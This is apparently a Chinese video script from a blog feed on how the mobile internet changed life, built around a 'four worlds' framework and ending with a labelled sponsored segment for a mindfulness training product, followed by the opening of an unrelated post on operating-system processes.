各种各样的终端，比如说PC，包括功能机，包括甚至银行门口的ATM，这种嵌入式的设有设备，都是以场景和功能为设计出发点的，也就是说，我模拟一下这个，当时这些终端的开发者怎么想的，他们在设计的时候大概想的是：首先 ，我这个设备大概是在哪里被使用的，是银行门口站着用的，还是在家里桌子上，然后或者放腿上使用的，确定了场景之后，再看看我想让这款，这款终端实现什么样的功能，确定了功能之后，我再倒推这些功能需要什么样的硬件，我需要设计一套什么样的交互，或者说操作流程，然后把它设计出来，</p><p>iPhone为什么说是 范式革命呢，因为iPhone，从头到尾就不是这么这么玩的，iPhone的设计师或者说乔布斯，他是基于人的身体和人的行为，作为设计原点的，他的思路是，我先去琢磨人怎么样使用工具，人习惯用什么样的姿势什么样的动作，人都会出现在哪些场景之中，那么在这些场景之中，人类行为模式有什么特点，有什么差异，包括有什么信息，咱们人类没有办法，人体没有办法明确的感知到，但是它却非常重要却是有价值的，我用机器帮你感受，那么正是这个设计原点上的不同，才有了iPhone和此前终端的两个非常重大的区别，就是智能手机iPhone，它需要去感知人体和感知环境，所以它上面有了各种sensor，有了各种传感器，类似于陀螺于重力感应光线距离感应，温度感应，GPS模块对吧，同时呢智能手机iPhone，它是以人的原点为设计的，所以它几乎完全摒弃了键盘和按键，那样很不人类那样很不自然，iPhone上面用了大量自然直观的交互 ，现在可能大家已经习以为常了，但是当年是造成轰动的，类似于这个双指的缩放，然后上下的这个滑动翻页，还有包括右滑解锁，还有这个手机然后倒过来重力感应，自然这个屏幕就变了，等等这样的交互，</p><p>那么如果总结来看的话，就是，iPhone站在前人的技术积累的肩膀上，用完全不一样的角度和观念，去真正把手机变成了人的延伸，从iPhone开始，手机就仿佛变成了我们的另一个器官，</p><p>（2100字标记）</p><p>2,微信和QQ最大的区别是什么</p><p>如果说这个iPhone是，移动时代的硬件起点，那么微信就是，移动互联网最标志性的软件之一，那对于微信为什么是划时代的软件，我们用后视镜去看也很容易存在误解，很多人比如说就会认为，微信之所以他在移动互联网初期，大放大换光彩，那么就是因为他能发语音，这是个典型的错误认知，因为QQ其实在二零零几年的时候，就可以发语音了，然后甚至可以多人语音可以发图片，然后可以视频通话，而且QQ在2003年的时候就有手机版QQ了，手QQ空间也比微信朋友圈早很多年，那么为什么微信而不是手机QQ，成为了开启移动时代的软件应用呢，</p><p>这个问题我有一个自己的看法，就是我个人认为，微信和QQ真正质的差别体现在哪里，体现在一个非常小的功能上，就是QQ有在线离线和隐身对吧，这个使用者的状态，微信没有，微信默认用户是在线的，这看上去是一个小小的差别，但是它实际上，背后是设计思路上的巨大变化，它体现出了智能手机，或者说移动互联网时代的应用特点，那么这就是，当iPhone让移动终端动起来之后，随着人体行动之后，随地anywhere就进一步变成了随时anytime，微信从最开始就是为了一个，随时在人身上，然后存在的这种移动终端而设计的，这是他和QQ的区别，</p><p>那么既然微信时刻都存在在一个，随时都在人身上，甚至随时被拿到手上的终端，那当然也就不存在离线和在线的区别，对吧，微信是时刻在线的，只是，我们人的注意力并不时刻在微信上，而已这这句话有点绕你理解一下，很简单，我们可以现在在聊天在睡觉在开车，我们可以现在没有在看微信，但是这并不是离线，那同样的道理，正是因为设计原点不同 ，所以同样的语音功能，在QQ上没有掀起什么水花，但是语音，在微信上成为了杀手级的功能点，这是因为此前的QQ，它的设计思路还是用让用户在一个，注意力比较集中的状态下，或专门去用这个软件，当你在这个状态下，你双手都有空的时候，语音在单位时间下的低信息量，这个弱点就非常明显，那用户就不爱用，但是微信是让用户全天候使用，或者说陪伴的，那么这时候就有很多，这个不期而遇的状态，比如说你在走路的时候需要回微信，你在做家务，在做别的事情的同时，你有回微信的需求，所以语音在这个时候，在微信上就大放异彩，那至于 后面的微信朋友圈，又是另一个大话题了，我们后面再说，</p><p>那么上面我用两个例子说明了，移动时代，为什么在我看来，是人类生活的一场 范式革命，那么这场范式革命，对我们有什么重大的影响呢，他又会最终通向何方，我们接着往下讲，</p><p>（3100字标记）</p><p>3,四个世界</p><p>通过刚才上面这两个问题，我们进入到了一个可以聊，比较微妙的认识论话题的语境当中，我们具备了这样的敏感度，另外呢我们也对移动互联网，给我们带来的生活范式的改变，做的信息上的铺垫，那么下面，我就来展开这期视频最重要的框架，也就是我们人类所处的四个世界，那么这个话题可能会比较绕，所以我会说的比较啰嗦比较完整一点，</p><p>那么在移动互联网兴起之前我们，人类其实生活在三个世界里面的，第一个世界所有人都能get到对吧，就是现实世界，或者说你叫物理世界也可以，这个世界是由物质组成的，客观事客观世界，也许你会觉得这样一个世界就够了，但是问题在于什么呢，问题在于，现实世界，我们是没有办法直接感知和了解到的，我们作为一个有限的三维生物，我们永远也没有办法真正了解到，真实的完整的客观世界，现或者说现实世界，</p><p>那么这就带来了第二个世界，第二个世界是感知觉的世界，我们人类用感官比如说眼睛，比如触觉，去捕捉现实物体，世界中有很有限的一些信息，我们的神经系统处理这些信号，把它们转化成能被人体传输的，能被人体接收的这种刺激信号，传递给大脑，大脑接收的这些信息，在潜意识层面去做信息整合，去做模式识别，也就是所谓的这个知觉过程，那么知觉，能够让我们识别出现实世界，一个个所谓的对象，比如说我们能够识别形状识别轮廓，是我们甚至能识别一些更复杂的东西，类似于我们能够识别出，这是一颗一棵树木，这是一个苹果 ，然后这是什么样的文字，那么第二个世界感知觉的世界，就是我们能够感知世界，认识世界的前提，但是呢如果只有第二个世界仍然不够，因为我们的人脑虽然非常强大，但是也是一种比较有限的器官，那么就算大脑的知觉系统，已经在潜意识层面，为我们把信息进行了初步的处理和筛选，但是，这些筛选后的信息依然太杂乱太模糊，我们没有办法去依靠他们，进行稍微复杂的一些判断，思考或者决策。</p><p>那么第三个世界就来了，那就是意义世界。在这个世界里面，我们把简单的信息结构化，我们通过符号和概念，构建出繁多的理论和叙事，我们用科学去解释世界然后预测未来，我们讲出一个又一个个的故事，我们把这些故事传递下去形成文化，构建出想象的共同体，这些共同体是 ，家庭宗教宗族民族国家，然后呢我们再用这些共同体，对我们自身进行定位 ，我们到底是谁，我们在哪，然后我们个体获取意义感安全感，还有价值感，包括我们将感官刺激抽象成审美风格，发展出人的艺术，去满足一些更更微妙的需求，那么这个就是第三世界，是意义世界。</p><p>（4200字标记）</p><p>上面所说的物，意世界，并不是一个维新或者玄学的手法，它是非常实在的，它是融入我们每一个人生活的，我举一个很实在的例子 ，就是假设你和一个姑娘谈恋爱，你真实获取到的信息有什么呢，其实非常有限，就是这个姑娘长什么样子，声音是什么样子，和她肌肤相亲的时候的触觉是什么，基本就没了。但是你的思维活动是非常丰富的，它都有哪些呢，比如说首先你会判断的好不好看，符不符合你的审美，那么但是美存在吗，这个世界上可能根本就没有美，美只存在于意义世界里，然后呢你会可能会看他的性格好不好，但是性格这个东西真的存在吗，能被你感知到吗，其实也并不能，你真正能够感知到的，就是观察他的一些行为，然后用这些行为，去往你这辈子此前的生活经历，和知识结构上面去套，你觉得他的行为符合某种模型，某种模式 ，比如说 他就算很生气，他跟你在吵架他也能讲道理，于是你说哦，他是一个比较理性而且脾气不错的人，但其实这只是你的推测和意想，是发生在意义事件里面的，</p><p>另外就是你和他之间的恋爱关系，甚至也是不存在的，现实世界中不存在恋爱这种东西，那么恋爱，是你通过很有限的信息和大量的意向，觉得你们俩的关系，符合某种人类关系模型，于是你就把他看作是你的女友，你和他的关系，本来就是在意义世界中存在的 ，包括我们在推演的更极端一点，为了让这个例子很有说服力，就是假设你想象，你现在是一个古代的军人，你被国家发配到边疆去保卫国家了，然后呢你和你的妻子5年都没有联系，那么这个时候在第一世界当中，物理世界当中，你的老婆没有死，你老婆存在，但是在第二世界中，在感知觉的世界中他其实完全消失了，因为你5年内都没有得到任何，关于他的真实信息，但是，你仍然会认为你的妻子还是你的妻子，你也仍然认为，你们两个人的夫妻关系依然存在，这就是因为有第三个世界存在，你们的关系在意义世界中继续延续，</p><p>（5000字标记）</p><p>所以说那我说的这个意义世界并不是所谓的高级知识分子，才会拥有什么世界 ，我们每一个人，或多或少都在构建，一个和自己有关系的意义世界，那可以说呢一直到21世纪初，在移动互联网之前，我们人类基本上生活在这，三个世界里面的，</p><p>那么到了近20年，我们又衍生出了第四个世界，我把它叫做数字代理世界，那么数字代理世界出现的前提是，移动终端的出现，以及，脱离个体之后依然运转的数字结构，比如说社交媒体，或者说MMRPG 这这种网络游戏，那么有了这两个前提之后，人们就可以把一个数字自我，寄托在数字代理世界里面，而且呢，就算我们此时此刻没有在互联网中，去和别人进行交互，那么代理世界也并不会完全消失 ，</p><p>这么说可能不太好理解，这里要要举一些例子，就是我举两个第四世界的例子，第一个是微信朋友圈，我们在发了朋友圈之后，我们可能放下手机去做别的事情了，我们去做一些家务我们去学习，但是这条朋友圈后续的状态，仍然会在我们的脑海中萦绕，我们仍然就会去想象，我们会去想象他被人看到，被人点赞的情况，我们会去想象，这条朋友圈给我们虚拟人格，给我们对外的形象造成的影响，</p><p>另外一个例子是魔兽世界，MMORPG呢，并不是在我们关闭的那一刻就消失了，就算我们关掉了魔兽世界，我们去看别的事情了，我们还是会想象出一个和我们平行运转的世界，这里面有，别人的数字代理身份和n p c，在进行的各种各样的活动，在这个世界里面，那么魔兽世界也有一套自己的时间表，比如说精英怪什么时候刷新，然后公会活动什么时候继续开荒 ，它依然是存在的，</p><p>上面这两个例子呢，就发生在数字代理世界中，我们可以总结出，数字代理世界有几个特性，第一是它像意义世界一样，可以脱离人类存在，第二是我们的虚拟人格，必须在其中有所映射，我们可以把一种代理身份寄托在里面，第三是数字代理世界需要是计时性的，它像第一世界和第二世界一样，是发生在此时此刻的世界，</p><p>4-现代人深入骨髓的焦虑和疲惫</p><p>那么下面说的这个4个世界，他们的关系是紧张的 ，其中第三世界会在一定程度上挤压第二世界，第四世界会在一定程度上抵押第三世界，而且在极大程度上挤压第二世界，说的很绕 ，但是我给下面给大家解释，从某种某种角度来说，我们的意义世界是从现实世界中抢出来的，意义世界展开的前提是需要时间差的，那么我们需要把此时此刻，在现实生活中发生的事情，我们感觉到的信息，和过去或者未来的某件事物，或者某种概念相连接，意义才会产生，</p><p>（6000字标记）</p><p>那么这里请注意，我并不是在说，我们此刻的生活没有意义，我是在说，我们此刻，所经历的事物的意义并不在此刻显现，他一定在别的时候显现，那么如果一个人完全沉浸在现实里 ，他就在做他做的事情，他就感知他感知的，信息听上去很有禅味 ，那么其实对他来说，异世界的存在空间就比较有限，所以呢每个人第三世界的重要性的占比是不同的，</p><p>对于像比如说 梵高或者爱因斯坦，或者吟游诗人这样的人，他们可能更多的生活在第三世界里面，他们的异世界非常的雄伟非常壮丽，吸引了他们大部分的注意力，和脑部活动的分配，但是比如说我们对一个，中世纪在城堡里干活的普通农奴来说，他的意义世界可能就只有一些，关于国家，宗教和世界的神话叙事，而且这些叙事基本上是静态的，他平时不会太太多去想，不会在日常在显意事中去过多思考，这些只是他思维的一个背景板，那么对于这个中世纪的农奴来说，他的第三世界版图和占比就会比较低，</p><p>所以这就是我说，第三世界和第二世界是相对紧张的关系他们虽然不是一个零和的关系，但是也绝不能说是互相不干扰的，那比如我们经常说的，这个人太沉浸在自己的世界里了，在生活中是个白痴，这是什么意思呢，其实就是说，这个人更多的生活在第三世界，而忽略了一二世界，或者我们换过来反过来，我们说这个人太俗了太入世了，其实就是说，他的第二世界的主导性太强了，他生活就是纯粹的吃喝拉撒睡，其他的什么都没有，那么于是他的第三世界就会比较狭窄，</p><p>那么进入到现代以来呢，我们的意义世界本来就经受了很大的冲击，文艺复兴之前，我们的意义世界是被神话，是被信仰统治的，文艺复兴之后，异世界发生了非常重大的危机，人类社会中，那些绝对和永恒的概念体系，被新的科学范式，被新的经济结构冲击的七零八落，神明死了，然后大的血腥家族解体了，我们的这个信仰还有价值观念，从绝对的变成了相对的，还有个人化的，那么这就是现代性危机，</p><p>那么近100年的现代社会，用科学用消费用个体价值，用很多其他的东西，去对意义世界进行了重新的填充，但是我们的意义世界，已经没有办法回到古代了，那我们现代人经常会感觉到疲惫，焦虑无力，其中一部分原因就是，我们不再清晰的知道我们是谁，不再清晰的知道我们在做的事情，什么价值，包括身边的人和自己是什么样的关系， 我之前出过两期，我很满意的这个附近的消失的视频，讲的就是这个事，尤其是我觉得这三四年在后疫情时代，我们所处的环境，不确定性进一步增大了，我们和身边人的连接进一步的减弱了，那么，当我们看到大量的负面信息的时候，就非常容易陷入到这种孤立无援，无法自治的情绪风暴里，</p><p>（7000字标记）</p><p>那么近20年，第四世界的到来，并没有缓解我们的精神困境，反而加剧了消耗，那这个东西很有意思 ，就是你们你们可能观察到了，b站上有一个每隔两三个月就会重新，出现的爆款选题，这个标题大概会是 ，短视频正在毁掉你的生活，或者是手游正在变成废人， 有没有那味，你们你们回想一下，你们肯定刷到过类似的视频，然后动不动就一二百万播放，那他的大概意思就是，互联网时代，非常廉价的唾手可得的这种内容，消费上的快感刺激，会让我们的生活变得碎片化，我们看书看不下去学习学不下去，思考也难以持久，因为手机在我们旁边，我们稍一不注意就会刷手机刷一晚上，然后抖音B站，小红书微博我们就停不下来，但其实呢，这方面的也就是时间的碎片化，还只是移动互联网，给我们带来的表层影响，互联网对我们大脑真正的影响，在于我们大脑的内存被更多占用，</p><p>那么我先把来解解释一下，大脑内存是个什么概念 ，就是你们有没有一个体会，我们生活中最疲惫的阶段，其实都不是简单的劳累导致的，我举个例子，比如说你最近和你的恋人吵架了，在冷战然后呢你们俩有可能分手，其实吵架本身并不占用很多时间，但是你会感觉到非常非常疲惫，这是因为我们的注意力，我们的大脑内存是有限的，你的情感危机虽然消耗不了多少体力，但他一直旋制在这里他是一个事，你不可能不注意他，那你不可能不去关注这个问题，这样一来，你用来处理其他事物的大脑内存，就被占据了，</p><p>我再举一个更常见的例子，我本人是严重的拖延症晚期患者 ，我我特别常见 ，有一种情况对于我来说，就是我攒了一些几个deadline，突然集中在某几天，然后我就，会发现在这种情况下，我会因为焦虑选择继续拖延，比如说我明明应该写文案应该剪视频，但是莫名其妙我玩了一下午PS5，然后呢我撸了好几个小熊猫，但是呢，这时候会有一个很有意思的现象，就是这些娱乐活动，本来是能够给我带来放松的，但是在此情此景下，他没有办法给我带来任何的放松，我明明休息了几个小时，放松了几个小时，但是我却感觉到非常累，那就连玩也没有办法给我带来快感，也没有办法让我投入，那我相信屏幕前面的很多人，应该也有这种体会，那么这就是因为你虽然没有在工作，但是你的大脑内存，被你需要工作这件事挤占了。</p><p>（7900字标记）</p><p>所以说第四世界到来更大的影响是，他把我们本来所剩不多的大脑内存，又分走了一块，在移动互联网之前，我们的自我认知来源于第三世界，也就是说， 我们在各种共同体中的位置，我们是谁谁谁的儿子，我们是谁谁的父亲，我们是某种组织的成员，我们是某个民族的人，我们的自我认知，很大程度上贴在这些东西上的，那除此之外呢，还有就是我们结合了他人的评价之后，我们对自身形象的一种想象和填充，这些构成了我们的自我认知，也就是我是谁，那在移动互联网之后，我们在社交媒体中，经营的这个数字代理身份，很大程度上接管了一部分的自我认知，也就是你发的朋友圈，你的微博你的微信，在这些场景中的表演，也同样会构成你对自身形象的想象，</p><p>那在这里 可能有人会觉得说 ，我不同意 ，我这个完全不是这样的，那有人会说，我本人会把，我的数字人格和现实的我完全切割， 数字人格是一个完全的游戏，他影响不了我，但是第一点，只有很少的玩世不恭的人会这么去做，因为这需要很强的自制力，需要很强的表演能力，一般人不会把数字身份，完全的当成一个游戏，因为这没有必要而且很累，</p><p>第二点是，我们的数字身份和现实身份，在这个时代，已经越来越多结合在一起了，没有几个社会人真的会说，微信和自己的生活和工作不相交，其他的社交媒体其实也是一样的，</p><p>第三点是，当这个时代数字人格越来越丰富，越来越重要的时候，数字人格会反过来塑造你的现实人格，那通俗一点的说，就是你会觉得微信微博，小红书上面的你才是你，那你会潜移默化的觉得这些APP上，上面呈现出来的那个精致的你才是你，包括你可能会每次，p图之后才发社交媒体，然后你会觉得，你p过图的那个你才是你的真实长相，你会觉得你和那个一样美，那么这就是一个例子，就是数字人格在这个时代，会反过来把你给洗脑，那么当我们的数字人格和主人格，数字代理身份和主身份，共同存在的时候，就相当于我们在同一个大脑的硬件上，又开了一个虚拟机，我们运行了两套，甚至更多套的操作系统，</p><p>就是我最开始在做UP主的一段时间，里我每次发完视频之后的一到两天，我大概每隔十几分钟我就会打开b站，看一下视频的播放量，再看人数，3连数据弹幕评论 等等等等，还有有没有关注我，那么这两天的时间，我几乎做不了任何其他的事情，那这种情况一直到2021年之后，我差不多麻了，然后才慢慢减弱，而且我问过其他的UP主，相当高比低的UP主都有这种体验，这就是，第四世界对我们大脑内存的挤压，我的注意力被第四世界拽走了，那么这个是移动，移动互联网时代的一个特特有的现象，比如说50年前的专栏作家，他在报纸上发文，文章之后他也会关注这个反馈，关注自己文章的反馈，但是呢他和现在又不是一回事，当年的专栏作家，虽然很在意自己文章的反馈，但是他缺乏有效的渠道，去得到这些反馈，而且就算是他能够通过一些方式得到，也不可能是完全即时性的，我们现在的反馈是不一样的，我们所处的第四世界，是一个完全即时性的世界，也就是说有人给我点赞评论，我当时当刻就能看到，那么我们在头脑之中，就可以构建出一个和现实世界时间，平行的场所，那上面同步有其他的个体，其他的数字人格其他的事物在运转，而且它能够形成一定的沉浸感，不管我们本人此刻有没有参与其中，那正因为这样，我们的大脑内存，就会被第四世界所分走，</p><p>（9200字标记）</p><p>关于大脑内存呢，我就说这么多 ，不知道我有没有说明白，大家能不，能get到，我是觉得，其实这两年特别流行的那个词，就是所谓的精神内耗，很大程度上，就是因为我们的大脑内存满了，我们需要考虑和挂念的东西，实在是太多了，现实世界就有很多寻而未觉的事情，对吧数字代理世界又开了个虚拟机，然后分走了很大一块注意力，大脑内存满了，我们在这种情况下，虽然还可以进行惯性式的思维活动，但是我们深层次的情绪能力情感能力，深层次的观察思考能力，深层次的创造力还有思维活力，都被大大的抑制了，这就是为什么，我们明明物质生活变得更好了，但是每天却更加的焦虑疲惫了，很大程度上就是这样的一个原因，</p><p>5-夺回我们自己的生活</p><p>上面呢说了这么多，都是在进行尝试性的归因，也就是我们的精神困境到底是什么，为什么存在，那么下一步问题就是怎么办，对现代人来说，我觉得如何回归一个自足的，融洽的自我状态，是一个非常重要的议题，对于这件事有几个常见的思路，那么第一种是靠简单的娱乐和休息，比如下班之后回家，然后刷手机 玩游戏，但是这其实很难奏效，那移动互联网时代呢，因为算法让内容供给者加速内卷，那么我们能消费的内容节奏越来越快，刺激越来越直接简单，做这些事情很难说是一种真正的休息，他没有办法缓解我们深层次的疲惫感，那么这一点我深信很多人能够有共鸣，就是靠简单的刺激性的娱乐，是没有办法缓解这种疲惫的。</p><p>第二种方式呢，是靠一些正能量的暗示 ，比如说经常去默念 我很棒，我不焦虑 我能行一切都会顺利，这招对于少数天赋异禀的人，可能是有用的，但其实呢，这是在通过否认实质性的问题，试图逃避和绕开自己的困境，我相信大多数人，其实都很难通过自我暗示，来解决精神困境的问题，甚至有可能起到反效果，我觉得呢在一些格外困难的大家，内忧外困的生活低谷期的时候，这种特殊的时期，大家可以试着每天起床睡觉的时候 ，给一些心理暗示，但是呢我觉得，它主要是这个短期起效的强心针，像强心针一样的东西，它如果每天都使用就像褪黑素一样的，久了就麻了就没有用了，不能作为日常的方式，</p><p>（11000字标记）</p><p>第三种呢，是靠自律来缓解碎片化生活的情况，用强大的意志力，还有一些电子化的辅助手段，养成生活习惯，比如说一些时间管理类的APP，那可以屏蔽消息，然后用一些奖惩原理，让我们每天晚上连着看1小时书 ，或者进行一些心流写作呀，或者是锻炼呀，然后调整入睡时间等等等等。这方面的尝试，其实每个人都应该做一下，我也在做在时间方面的自控，自律管控，也是移动互联网时代，每一个人的必必备生活命题。但是呢我总体上是觉得，完全用自律来解决我们的精神内耗，更适合那些在职业方面压力不大的人，然后呢本身自制力就比较强的人，我想了一下我自己可能就不太适合，因为我自己几年前这个996的时候，本身我自制力就比较一般，上班已经非常非常累了，回家往沙发一躺我就很难起来了，我我当时我回想当时 ，很难有这个心力再去约束自己的行为，所以说这一点呢，大家都应该去尝试做一下，但是我觉得靠他，完全靠他去解决我们的精神内耗，是比较困难的，</p><p>第四种，是直接解决大脑内存被占用的问题，这方面呢也有不同的解决方案，比如说最近10年有一种方式很受欢迎，就是越来越多人会采用这么一种，行为艺术，那我把它叫做精神层面的轻断食尝试，就是说很多人很多城市人职场人白领，会尝试在一两周的时间里面强行断网，远离这种现象的工作需求，远离现象的社交，远离各种现象的信息刺激，比如说他们会做一个大的旅行计划，出去玩，甚至呢干脆去乡下过几天田田园生活，去城市周边的寺庙里过几天修行生活， 也可以。反正就是不管用什么方式，回归生活回归宁静回归思考。那么这两周的时间过去了，压力清空了再回归城市生活，</p><p>这种方式呢在短期内肯定是有效的，我也喜欢几个月就出去玩一玩，哪怕只是很简单的在另外一个城市，在海边去宅一宅换换心情也是有效的，但是这种方式也有一些问题，就是我们现代城市人，不可能真正长时间的拖地工作，也不可能真正长时间的永远断网，我们的一部分社会关系和工作关系，乃至一部分生产流程已经是线上化的，那强行戒断互联网，只能说是一种不错的体验，但是他治标不治本，我们的工作社交还有日常生活，已经在事实上没有办法脱离互联网了，那如果我们没有办法在日常生活中，适应这样的生活范式，那么这些疲惫感焦虑感，那最终还是会在断网，会在这个精神轻断食，之后的一段时间内转土重来，</p><p>那这样的精神轻断食呢，注定只是少数人的奢侈游戏，因为他要求有一定的精神时间自主性，你得你得请的起假，还有一定的经济能力，这样的人才能真正去践行，那么现实中能够这么做的人，往往是职业经理人创业者，或者是自由职业者，才玩得起这个模式，</p><p>（11000字标记）</p><p>6,广告时间-正念训练</p><p>那么还有一种方式，能够解决大脑内存的问题，把我们的创造力思维活力，还有精神灵活性，解放出来，就是正念，正念这种训练方式天上有些玄学 ，甚至带有一些宗教性，但是其实现代意义上的正念，已经剥离了玄学成分，是一种科学的训练方式，他的运作机制也很简单 ，在我看来，正念就是通过将自我回归到，第二世界的方式，我就回归到这个感知觉世界的方式，去重新塑造大脑内存的分配，锻炼大脑的注意力品质，让我们夺回精神世界的控制权，</p><p>那这期视频呢，感谢暂停实验室为我提供的，正念训练体验 ，我下面从自己的亲身体会，给大家讲一讲，正念是怎么玩的，怎么运作的，正念训练的第一步往往都是正念呼吸， 这第一步的正念呼吸其实一点都不复杂，就是把注意力集中，在呼吸的一件事情上，去感受仔细感受呼吸的动作，控制控制这个呼吸的节奏，非常有意思的一点就是，如果现在我说，不通过任何方式，凭空让你不要胡思乱想，一般人其实做不到的，没有经过训练的话做不到。因为我们的思维，就像闹市旁的这个十字路口一样，总会有这样那样的车冲出来，但是通过关注呼吸，我们可以做到，收塑我们纷繁的念头和想法，我们觉察自己的感受动作，然后大脑恢复成一个空的状态，那，当我们关注和觉察自己的动作的时候，实际上我们也就确凿，无疑的证实了自己的存在，因为我能够觉察到自己的感受，自己的动作，那我毫无疑问的就通过肉身而存在着，那么这就让第四世界，占用的大脑内存和数字，人格被收回来一些，</p><p>正念呼吸呢，只是为期25天的，这个暂停实验室练习计划的一部分，之后的正念训练就会超越，冥想的单一方式，会蔓延到我们各类的日常行为，还是比较丰富的，比如说正念进食正念行走，然后反复去强强化这些训练，正念的最终目的是什么，他的正念这件事，最终的目的并不是让我们乐观，并不是让我们正能量的，去看待自己的生活世界。正念倡导的根本就不是正能量，而是非评判，也就是说，他鼓励我们看到事物和自己本来的样子，去获取关于自己，和身边世界此时此刻的真实信息，比如说如果我自己就是在经受痛苦，那么他让人做到的，就是去细致的体察此时此刻的痛苦，不做评判，在一定程度上抽离，从外部去观察自己的情绪，那我们的大脑是一种非常，非常神奇和微妙的器官，当我们，体察和确认了一种负面情绪的时候，实际上，并不需要对他做额外的更多的事情，这种负面情绪就已经会缓解很多，那我在做，暂停实验室这个正念训练，这20多天的这个周期里面，想起来我小时候一种处理疼痛的方式，我小时候自然而然就会这么去做，就是小的时候如果我打架了，或者说我磕碰了，然后我疼痛难忍的时候，我会反而把注意力集中在疼痛上，那我会试着去拆解疼痛，我去感受到底它是什么，到底它有多疼，然后呢只要我这么去做了，疼痛就会变得没有那么折磨，因为绝大多数的疼痛其实不过如此，那小时候的我其实就发现了，就是我自己是在恐惧恐惧本身，而不是在恐惧疼痛，只是那时候，可能没有这么强的表达能力，把它说出来，</p><p>（12300字标记）</p><p>具体来说，暂停实验室最近的这个正念训练，对我造成了什么影响呢，我不知道大家有没有发现 ，我从1月底到现在，更新的频率明显加快了，这个事很有意思，其实呢，我并没有每天增加多少工作时间，大概我每天仍然是这个，可能三四个小时的内容生产，但是呢，正念给我带来的一些意料之外的变化，就是我通过对自己的觉察，我就发现，我之前视频的调研和构思阶段，往往效率是很高的，但是一到写稿和录制阶段就拉跨了，就非常低效，拖延非常严重，那么为什么呢，其实，我恐惧的并不是写作或者录视频本身，我恐惧的是，自己没有办法很好完成写作的这种预期，带来的挫败和不安，那么一旦我觉察到了这一点，正视自己的情绪，其实自然而然就解决很多，因为其实这种挫败感并没有多了不起 ，我其实是能够接受的，那么用通俗的话来说呢，就是我在写作和录制上面的精神内耗，通过正念训练变少了很多，另外就是，正念让我的大脑内存变得更加充裕了，让我切换状态呀，调度注意力的过程变得更加灵活了，自主性更高了，所以呢，虽然这段时间我的工作时长变化不大，但是呢我能够更好的，更自主的安排自己的时间了，也能够更快，更稳定的进入到那种新流状态，进行高效的生产活动，之前的那种表面上我在写稿子，但是其实隔几分钟就去微信聊天，或者看个视频，然后几个小时也没写几个字的情况 ，现在几乎不存在了，那这是一个效率上面巨的飞跃，</p><p>那其实除了这些，还有一个比较私人化的影响，就是我会发觉呢，嗯经过这三年的时间，我做视频的发心没有那么纯粹了，那2019年我刚做视频的时候，我想的东西很少，我那个时候只要有表达欲，觉得有人想听然后我就会说出来，我就会发视频，现在呢我考虑东西更多，比如说会考虑一些 ，这个视频会不会影响我频道的调性，会不会让人，觉得我深度不够，会不会不符合受众对我的期待 等等等等，这些乱七八糟的想法，他通过正念，我对自己动机和想法上的这个观察，更加敏锐了，那么我一旦意识到了，就是自己这方面的变化，我就有意识的进行一些调整，让自己更纯粹的去释放表达欲，那么现在呢，我是这个，一旦对某个话题有比较强的表达欲，我就会迅速的做一下判断，我的基本观点到底有没有差异化，然后这个话题有没有基本的社会价值，和受众价值，迅速的做一下判断，如果觉得值得做，我就会在短时间内我尽快的去调研，尽快去思考，然后不去想太多别的录了我就发出来，这就是正念不期而遇给我带来的影响，</p><p>（13300字标记）</p><p>其实我在尝试之前呢，根本没有预期自己能有这样的变化，但是非常有意思，就是通过正念，我附带着能把我视频产量这个，老大难的问题，至少暂时性的解决，当然这是正念对我本人的影响，对于你们来说因为你们不是UP主吗，可能这个影响会是别的，比如说可能会提高，你们的感情上的情绪调节能力，或者是下班之后的时间安排能力，或者甚至是，能够让你们进行更好的体重管理，和健康管理，根据每个人想法和情况的不同，这些上面的都有都有可能，但是我觉得万变不敌其宗，正念呢相当于是一种大脑锻炼术，能够加强，一个人对自己精神世界的觉察能力，能够提升，一个人对自己注意力的掌控能力，包括提升思维的灵活性和创造性，那么屏幕前面你们如果有一些，也有一些这个情绪问题，或者注意力难以集中的类似的问题，或者感觉到心力不足，然后疲惫不堪的情况，你们可以试一试，暂停实验室的这个正年训练，</p><p>那么根据我的体验呢，暂停实验室的这套产品，是我目前看到的，市面上最系统化的正年训练，暂停实验室的这个训练计划，其实不只有正念 ，他是包括了正念和书写，共同组成的头脑锻炼，但是我刚才说的主要是正念，因为我自己对他更感兴趣一点，这套训练比较关键的一点就是，他的产品设计的很巧妙，每天就半个小时，没什么压力，然后呢他把任务拆解的也很科学清晰，不会让人这个做着做着，不知道自己在干嘛，不会丧失目标感，并且呢，这个训练方式也有一定的趣味性，这样能让人练得下去，练得下去，我觉得在这个时代的这种，类似的这种这种解决方案中，是非常非常重要的，因为就算你效果再好，练不下去也是白搭，对我这种不太擅长坚持的人来说，这些产品设计是非常重要的，</p><p>7，结束</p><p>OK这期视频就基本结束了，关于移动时代的生活范式 ，关于四个世界，数字代理世界还有数字人格，其实这些是我去年元宇宙热的时候，我就想讲的一个框架，我非常真切的认为，移动互联网对人类生活的影响，全方位的，就算在今天仍然他是被低估的，那你如果觉得我说的有启发，希望你能给我一个三连。如果你对正念有些兴趣，也可以去体验一下暂停实验室的产品，那具体的相关信息，我会在发视频之后，放在这个视频的置顶评论里面，大家需要的可以自取，那我是老蒋咱们下期再见，</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Christmas Eve</title>
      <link href="/2022/12/24/Christmas%20Eve/"/>
      <url>/2022/12/24/Christmas%20Eve/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程</title>
      <link href="/2022/12/23/ORANGE&#39;S-6/"/>
      <url>/2022/12/23/ORANGE&#39;S-6/</url>
      
        <content type="html"><![CDATA[<h1>6.1 进程概述</h1><h2 id="6-1-1-进程介绍"><a class="header-anchor" href="#6-1-1-进程介绍">¶</a>6.1.1 进程介绍</h2><p>什么是进程？书中说：系统中的若干进程就像一个人在一天内要做的若干样工作：</p><p>总体上：每样工作相对独立，又受控于人，可以产生某种结果；<br>细节上：每样工作都有自己的方法、工具和需要的资源；<br>时间上：每一个时刻只能有一项工作正在处理，各项工作可以轮换来做，对最终结果没有影响。</p><p>进程也是一样：</p><p>宏观上：每个进程相对独立，有自己的目标/功能，又受控于进程调度模块；<br>微观上：它可以利用系统的资源，有自己的代码(做事的方法)，有自己的数据和堆栈(做事需要的资源和工具)；<br>时间上：进程需要被调度轮换，不影响最终结果。</p><p><img 